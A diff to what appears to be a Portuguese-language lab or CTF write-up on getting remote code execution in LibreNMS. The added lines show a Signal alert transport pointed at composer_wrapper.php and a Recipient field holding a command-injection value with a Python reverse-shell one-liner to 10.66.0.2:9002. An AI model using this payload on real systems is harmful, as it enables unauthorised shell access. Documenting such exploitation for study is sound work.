@@ -199,8 +199,18 @@ do binário** `signal-cli`. O LibreNMS passa os argumentos com `escapeshellarg`,
 `signal-cli` para esse wrapper, os argumentos viram comando. O gatilho é mandar um **alerta de teste**
 pelo transport.
 
-Monto uma reverse shell em Python, uso o [penelope](https://github.com/brightio/penelope) como handler,
-e o callback chega:
+Na prática: crio um transport do tipo **Signal**, aponto o **Path** para
+`../scripts/composer_wrapper.php` e coloco o payload no campo **Recipient** — é esse argumento que o
+wrapper reinterpreta sem sanitizar:
+
+![Tela de Alert Transport do LibreNMS configurando o RCE: Transport type "Signal", Path apontado para ../scripts/composer_wrapper.php e o campo Recipient com um one-liner Python de reverse shell](./img/librenms-rce.png)
+
+```text
+;python3 -c 'import os,pty,socket;s=socket.socket();s.connect(("10.66.0.2",9002));[os.dup2(s.fileno(),f)for f in(0,1,2)];pty.spawn("bash")';
+```
+
+Um **alerta de teste** dispara o transport, o `composer_wrapper.php` reinterpreta o Recipient, e o
+callback cai no [penelope](https://github.com/brightio/penelope) (handler com PTY decente de graça):
 
 ```console
 $ penelope
